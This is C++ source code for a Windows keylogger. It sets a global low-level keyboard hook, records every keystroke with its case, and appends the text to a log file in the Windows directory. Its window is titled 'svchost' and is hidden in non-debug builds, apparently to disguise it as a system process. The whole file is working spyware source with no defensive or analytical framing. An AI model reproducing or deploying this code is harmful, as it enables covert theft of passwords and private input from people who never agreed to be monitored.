// xG3nerousPluMx

#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>

#define	DEBUG	1

#define OUTFILE_NAME	"Logs\\WinKey.log"	/* Output file */
#define CLASSNAME	"winkey"
#define WINDOWTITLE	"svchost"

char	windir[MAX_PATH + 1];
HHOOK	kbdhook;
bool	running;

__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = {0};
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;
		if (!printable) {
			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;
			if (str == "ENTER") {
				str = "\n";
				printable = true;
			} else if (str == "SPACE") {
				str = " ";
				printable = true;
			} else if (str == "TAB") {
				str = "\t";
				printable = true;
			} else {
				str = ("[" + str + "]");
			}
		}
		if (printable) {
			if (shift == capslock) {
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			} else {
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}

#ifdef DEBUG
		std::cout << str;
#endif
		std::string path = std::string(windir) + "\\" + OUTFILE_NAME;
		std::ofstream outfile(path.c_str(), std::ios_base::app);
		outfile << str;
		outfile.close();
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}

LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
		case WM_CLOSE: case WM_DESTROY:
			running = false;
			break;
		default:
			return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance,
		LPSTR cmdline, int ncmdshow)
{
	HWND		hwnd;
	HWND		fgwindow = GetForegroundWindow();
	MSG		msg;
	WNDCLASSEX	windowclass;
	HINSTANCE	modulehandle;

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = CLASSNAME;
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor  = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	if (!(RegisterClassEx(&windowclass)))
		return 1;

	hwnd = CreateWindowEx(NULL, CLASSNAME, WINDOWTITLE, WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
			thisinstance, NULL);
	if (!(hwnd))
		return 1;
#ifdef DEBUG
	ShowWindow(hwnd, SW_SHOW);
#else
	ShowWindow(hwnd, SW_HIDE);
#endif
	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow);
	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

	running = true;

	GetWindowsDirectory((LPSTR)windir, MAX_PATH);
	while (running) {
		if (!GetMessage(&msg, NULL, 0, 0))
			running = false;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}
